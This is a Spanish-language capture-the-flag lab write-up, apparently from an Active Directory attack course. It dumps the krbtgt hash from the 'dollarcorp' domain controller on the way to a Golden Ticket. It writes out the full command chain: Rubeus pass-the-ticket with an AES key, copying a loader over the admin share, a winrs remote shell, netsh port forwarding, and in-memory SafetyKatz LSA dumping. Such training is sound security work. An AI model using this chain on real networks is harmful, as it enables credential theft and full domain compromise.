
## Tareas
- [ ] Extraer los *secrets* del controlador de domino de *dollarcorp*
- [ ] Usar los *secrets* de la cuenta *krbtgt* para crear un *Golden Ticket*
- [ ] Usar el *Golden Ticket* para obtener privilegios de administrador de dominio desde una maquina

**Flag 16: Hash NTLM de krbtgt**
**Flag 17: Hash NTLM del Domain Admin - Administrator**


## Extraer secrets del Domain Controller de *dollarcorp*

Como en nel laboratorio anterior acabamos con privilegios de administrador de dominio

Empezaremos abruiendo una ventana como Administrador de Dominio e iniciaremos un nuevo proceso como *svcadmin*
```shell
C:\AD\Tools\Loader.exe -path C:\AD\Tools\Rubeus.exe -args asktgt /user:svcadmin /aes256:6366243a657a4ea04e406f1abc27f1ada358ccd0138ec5ca2835067719dc7011 /opsec /createnetonly:C:\Windows\System32\cmd.exe /show /ptt
```

Se nos creara una terminal con usuario administrador, ahora tendremos que copiar el *Loader.exe* a la maquina *dcorp-dc*
```shell
echo F | xcopy C:\AD\Tools\Loader.exe \\dcorp-dc\C$\Users\Public\Loader.exe /Y
```

Nos conectaremos a la maquina como *svcadmin*
```shell
winrs -r:dcorp-dc cmd
```

Y haremos una redirección de puertos
```shell
netsh interface portproxy add v4tov4 listenport=8080 listenaddress=0.0.0.0 connectport=80 connectaddress=172.16.100.97
```

Ejecutando desde la memoria el *SafetyKatz*
```shell
C:\Users\Public\Loader.exe -path http://127.0.0.1:8080/SafetyKatz.exe -args "lsadump::evasive-lsa /patch" "exit"
```

Pudiendo extraer así los hashes *NTLM* en este caso el que buscabamos es el del usuario *KRBTGT*

